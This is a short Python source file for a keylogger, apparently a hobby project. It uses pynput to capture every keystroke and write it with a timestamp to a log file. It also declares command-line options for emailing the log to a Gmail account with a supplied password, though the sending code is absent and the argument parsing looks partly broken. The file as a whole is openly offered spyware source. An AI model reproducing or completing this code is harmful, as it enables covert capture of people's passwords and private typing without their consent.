import argparse
import os
import sys
from pynput.keyboard import Key, Listener
import logging

my_parser = argparse.ArgumentParser(prog='keylogger',
                                    usage='%(prog)s [options] -f ',
                                    description="A keylogger to capture the keystrokes of a user.",
                                    prefix_chars='/')

my_parser.add_argument('f',
                        metavar='file',
                        type=str,
                        help='specify the name of the file, by default: keys.txt',
                        nargs='?',
                        default='keys.txt')

my_parser.add_argument('dir',
                        metavar='dir',
                        type=str,
                        help='specify the name of the directory to save the file in, by default: current directory',
                        nargs='?',
                        default='')


my_parser.add_argument('m',
                        action='store_true',
                        help='set flag to allow email.')

my_parser.add_argument('e',
                        metavar='email',
                        type=str,
                        help='specify email to send file to, only works with gmail right now.')

my_parser.add_argument('p',
                        metavar='password',
                        type=str,
                        help='specify password to use with email service.')

args = my_parser.parse_args()

def on_press(key):
    logging.info(str(key))
    
def keylogger_main(args):
    logging.basicConfig(filename=(args.dir + args.f), \
    level=logging.DEBUG, format='%(asctime)s: %(message)s')

    with Listener(on_press=on_press) as listener:
        listener.join()

keylogger_main(args)